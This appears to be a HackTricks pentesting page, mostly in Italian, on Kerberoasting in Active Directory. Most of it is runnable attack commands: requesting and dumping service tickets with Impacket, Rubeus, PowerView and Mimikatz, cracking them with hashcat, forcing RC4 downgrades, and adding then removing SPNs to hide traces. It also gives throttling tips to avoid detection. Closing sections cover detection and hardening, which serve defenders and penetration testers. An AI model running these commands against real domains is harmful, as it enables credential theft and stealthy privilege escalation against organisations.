# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting si concentra sull'acquisizione dei ticket TGS, specificamente quelli relativi a servizi eseguiti con account utente in Active Directory (AD), escludendo gli account computer. La cifratura di questi ticket utilizza chiavi derivate dalle password degli utenti, permettendo il cracking offline delle credenziali. L'uso di un account utente come servizio è indicato da una proprietà ServicePrincipalName (SPN) non vuota.

Qualsiasi utente di dominio autenticato può richiedere ticket TGS, quindi non sono necessari privilegi speciali.

### Key Points

- Mira ai ticket TGS per servizi che girano con account utente (ossia account con SPN impostato; non account computer).
- I ticket sono cifrati con una chiave derivata dalla password dell'account di servizio e possono essere crackati offline.
- Non sono necessari privilegi elevati; qualsiasi account autenticato può richiedere ticket TGS.

> [!WARNING]
> La maggior parte degli strumenti pubblici preferisce richiedere ticket di servizio RC4-HMAC (etype 23) perché sono più veloci da crackare rispetto ad AES. Gli hash TGS RC4 iniziano con `$krb5tgs$23$*`, AES128 con `$krb5tgs$17$*`, e AES256 con `$krb5tgs$18$*`. Tuttavia, molti ambienti stanno migrando a solo AES. Non dare per scontato che solo RC4 sia rilevante.  
> Inoltre, evita il "spray-and-pray" roasting. Il kerberoast di default di Rubeus può interrogare e richiedere ticket per tutti gli SPN ed è rumoroso. Enumera e prendi di mira prima i principal interessanti.

### Service account secrets & Kerberos crypto cost

Molti servizi sono ancora eseguiti con account utente con password gestite manualmente. Il KDC cifra i ticket di servizio con chiavi derivate da quelle password e consegna il ciphertext a qualsiasi principal autenticato, quindi il kerberoasting permette tentativi offline illimitati senza lockout o telemetria DC. La modalità di cifratura determina il budget di cracking:

| Modalità | Derivazione della chiave | Tipo di cifratura | Throughput approssimativo RTX 5090* | Note |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 con 4,096 iterazioni e un salt per-principale generato dal dominio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 milioni di tentativi/s | Il salt impedisce le rainbow table ma permette comunque un cracking veloce di password brevi. |
| RC4 + NT hash | Singolo MD4 della password (NT hash non salato); Kerberos mescola solo un confounder di 8 byte per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **miliardi** di tentativi/s | ~1000× più veloce di AES; gli attaccanti forzano RC4 ogni volta che `msDS-SupportedEncryptionTypes` lo permette. |

*I benchmark di Chick3nman come riportati in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Il confounder di RC4 randomizza solo il keystream; non aggiunge lavoro per tentativo. A meno che gli account di servizio non si basino su secret casuali (gMSA/dMSA, machine accounts, o vault-managed strings), la velocità di compromissione dipende puramente dal budget GPU. Imporre etype AES-only elimina il downgrade a miliardi di tentativi al secondo, ma password umane deboli cedono ancora a PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Strumenti multifunzione che includono controlli kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerare utenti kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tecnica 1: Richiedi TGS e dump dalla memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tecnica 2: Strumenti automatici
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una richiesta TGS genera Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC e ambienti solo AES

- Richiedi RC4 di proposito per account senza AES:
  - Rubeus: `/rc4opsec` usa tgtdeleg per enumerare account senza AES e richiede RC4 service tickets.
  - Rubeus: `/tgtdeleg` con kerberoast attiva anche richieste RC4 dove possibile.
- Roast account solo AES invece di fallire silenziosamente:
  - Rubeus: `/aes` enumera account con AES abilitato e richiede ticket di servizio AES (etype 17/18).
- Se possiedi già un TGT (PTT o da un .kirbi), puoi usare `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` e saltare LDAP.
- Targeting, throttling e meno rumore:
  - Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtra per password probabilmente deboli usando `/pwdsetbefore:<MM-dd-yyyy>` (password più vecchie) o mira a OU privilegiate con `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenza / Abuso

Se controlli o puoi modificare un account, puoi renderlo kerberoastable aggiungendo un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Eseguire il downgrade di un account per abilitare RC4 e facilitare il cracking (richiede privilegi di scrittura sull'oggetto di destinazione):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Kerberoast mirato tramite GenericWrite/GenericAll su un utente (SPN temporaneo)

Quando BloodHound mostra che hai il controllo su un oggetto utente (es., GenericWrite/GenericAll), puoi affidabilmente “targeted-roast” quell'utente specifico anche se attualmente non ha SPNs:

- Aggiungi uno SPN temporaneo all'utente controllato per renderlo roastable.
- Richiedi un TGS-REP cifrato con RC4 (etype 23) per quello SPN per favorire il cracking.
- Effettua il crack dell'hash `$krb5tgs$23$...` con hashcat.
- Rimuovi lo SPN per ridurre le tracce.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizza l'aggiunta di SPN -> la richiesta di TGS (etype 23) -> la rimozione di SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Cracka l'output con hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

Puoi trovare strumenti utili per attacchi kerberoast qui: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecato in alcune distribuzioni)
- `rdate -n <DC_IP>`

### Kerberoast senza un account di dominio (AS-requested STs)

Nel settembre 2022, Charlie Clark ha mostrato che se un principal non richiede pre-authentication, è possibile ottenere un service ticket tramite un KRB_AS_REQ costruito alterando lo sname nel corpo della richiesta, ottenendo di fatto un service ticket invece di un TGT. Questo rispecchia AS-REP roasting e non richiede credenziali di dominio valide.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Devi fornire una lista di utenti perché senza credenziali valide non puoi queryare LDAP con questa tecnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Correlati

Se stai prendendo di mira AS-REP roastable users, vedi anche:

{{#ref}}
asreproast.md
{{#endref}}

### Rilevamento

Kerberoasting può essere stealthy. Cerca Event ID 4769 dai DCs e applica filtri per ridurre il rumore:

- Escludi il nome di servizio `krbtgt` e i nomi di servizio che terminano con `$` (account dei computer).
- Escludi le richieste dagli account macchina (`*$$@*`).
- Solo richieste riuscite (Failure Code `0x0`).
- Monitora i tipi di cifratura: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Non generare allarmi solo per `0x17`.

Esempio di triage PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Idee aggiuntive:

- Stabilisci una baseline dell'uso normale degli SPN per host/utente; genera un allarme per grandi picchi di richieste di SPN distinti da un singolo principal.
- Segnala l'uso insolito di RC4 in domini rafforzati con AES.

### Mitigazione / Rafforzamento

- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
- Enforce AES on service accounts by setting `msDS-SupportedEncryptionTypes` to AES-only (decimal 24 / hex 0x18) and then rotating the password so AES keys are derived.
- Where possible, disable RC4 in your environment and monitor for attempted RC4 usage. On DCs you can use the `DefaultDomainSupportedEncTypes` registry value to steer defaults for accounts without `msDS-SupportedEncryptionTypes` set. Test thoroughly.
- Rimuovi SPN non necessari dagli account utente.
- Usa password lunghe e casuali per gli account di servizio (25+ caratteri) se gli account gestiti non sono praticabili; vieta password comuni e verifica/audita regolarmente.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
